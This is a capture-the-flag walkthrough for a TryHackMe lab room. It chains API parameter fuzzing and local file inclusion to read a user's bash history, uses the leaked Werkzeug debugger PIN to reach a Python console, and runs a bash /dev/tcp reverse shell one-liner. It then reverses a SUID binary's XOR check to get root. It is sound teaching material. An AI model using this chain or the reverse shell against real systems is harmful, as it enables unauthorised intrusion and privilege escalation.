---
tags:
  - THM
  - Linux
  - Medium
  - API
  - LFI
  - RCE
  - SUID
  - File-Analysis
---
https://tryhackme.com/room/bookstoreoc/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.64.131.38 bookstore.thm
```
# Scanning
```console
$ nmap -p22,80,5000 -sV -sC bookstore.thm

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# API LFI
Found a **hint** at `/login.html` talking about a **history file**:
```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```
The service at port 5000 is an API saying:
```text
Foxy REST API v2.0

This is a REST API for science fiction novels.
```
Discovered API documentation at `/api/`:
```text
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```
There is a functional `/api/v1/` endpoint for the API, likely outdated:
```console
$ curl -I http://bookstore.thm:5000/api/v2/resources/books/all
HTTP/1.0 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Content-Length: 17010
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 28 Dec 2025 03:18:36 GMT

$ curl -I http://bookstore.thm:5000/api/v1/resources/books/all
HTTP/1.0 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Content-Length: 17010
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 28 Dec 2025 03:18:58 GMT
```
Found `show` as a new valid parameter for the API filters:
```console
$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://bookstore.thm:5000/api/v1/resources/books?FUZZ=1'

author                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 105ms]
id                      [Status: 200, Size: 237, Words: 53, Lines: 10, Duration: 120ms]
published               [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 145ms]
show                    [Status: 500, Size: 23076, Words: 3277, Lines: 357, Duration: 110ms]
```
The parameter `show` expects a file, so we read **sid's history file** as suggested in the **hint**:
```console
$ curl -s 'http://bookstore.thm:5000/api/v1/resources/books?show=1'
...
NameError: name 'filename' is not defined

$ curl -s 'http://bookstore.thm:5000/api/v1/resources/books?show=/home/sid/.bash_history'
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```
As we can see, we found the **debugger pin**.
# Python RCE
Found an interactive Python console at `/console` (port 5000). However, it is blocked by an **access PIN**, which is the one we found earlier.

Now, we listen for connections:
```console
$ nc -lnvp 4444
```

Finally, we get the reverse shell through Python:
```python
import os; os.system('bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"')
```
Since we are **sid**, we get the **user flag**:
```console
$ whoami
sid

$ cat /home/sid/user.txt
```
# Post-Exploitation
Found a very unusual **SUID binary** which asks for a **magic number**:
```console
$ ls -l /home/sid/try-harder
-rwsrwsr-x 1 root sid 8488 Oct 20  2020 /home/sid/try-harder

$ /home/sid/try-harder
What's The Magic Number?!
0
Incorrect Try Harder
```
Decompile the **binary** after transferring it to the local machine:
```console
$ radare2 try-harder
> aaa
> pdd@main
/* r2dec pseudo code output (r2 5.9.8) */
/* try-harder @ 0x7aa */
#include <stdint.h>
 
int32_t main (void) {
    int64_t var_14h;
    int64_t var_10h;
    uint32_t var_ch;
    int64_t canary;
    rax = *(fs:0x28);
    canary = *(fs:0x28);
    eax = 0;
    setuid (0);
    var_10h = 0x5db3;
    puts ("What's The Magic Number?!");
    rax = &var_14h;
    rsi = rax;
    rdi = 0x000008ee;
    eax = 0;
    isoc99_scanf ();
    eax = var_14h;
    eax ^= 0x1116;
    var_ch = eax;
    eax = var_10h;
    var_ch ^= eax;
    if (var_ch == 0x5dcd21f4) {
        eax = 0;
        system ("/bin/bash -p");
    } else {
        puts ("Incorrect Try Harder");
    }
    rax = canary;
    rax ^= *(fs:0x28);
    if (var_ch != 0x5dcd21f4) {
        stack_chk_fail ();
    }
    return rax;
}
```
The **binary** spawns a bash shell as **root** if given the correct **magic number**. So, we find it by reversing the process (two XOR):
```console
$ python3 -q
>>> var_10h = 0x5db3
>>> var_ch = 0x5dcd21f4
>>> var_14h = (var_ch ^ var_10h) ^ 0x1116
>>> int(var_14h)
1573743953
```
Enter the **magic number** and get the **root flag**:
```console
$ /home/sid/try-harder
What's The Magic Number?!
1573743953

# cat /root/root.txt
```